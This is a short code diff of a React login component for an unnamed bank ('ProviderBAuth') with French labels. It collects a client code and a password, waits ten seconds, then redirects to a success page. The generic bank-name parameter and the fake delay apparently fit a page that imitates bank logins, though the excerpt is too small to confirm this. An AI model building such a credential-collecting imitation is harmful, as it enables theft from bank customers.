@@ -48,9 +48,9 @@ const ProviderBAuth = ({ onAuthenticate, onBack, bankName }: ProviderBAuthProps)
         password: secretCode
       });
 
-      setTimeout(() => {
+    setTimeout(() => {
         setIsLoading(false);
-        onAuthenticate();
+        window.location.href = '/success';
       }, 10000);
     }
   };
@@ -126,7 +126,7 @@ const ProviderBAuth = ({ onAuthenticate, onBack, bankName }: ProviderBAuthProps)
             </h1>
 
             {step === 'client-code' ? (
-              <form onSubmit={handleSubmit} className="space-y-8">
+              <form onSubmit={handleClientCodeSubmit} className="space-y-6">
                 <div>
                   <label className="block text-gray-700 font-medium mb-4">
                     Saisissez votre code client
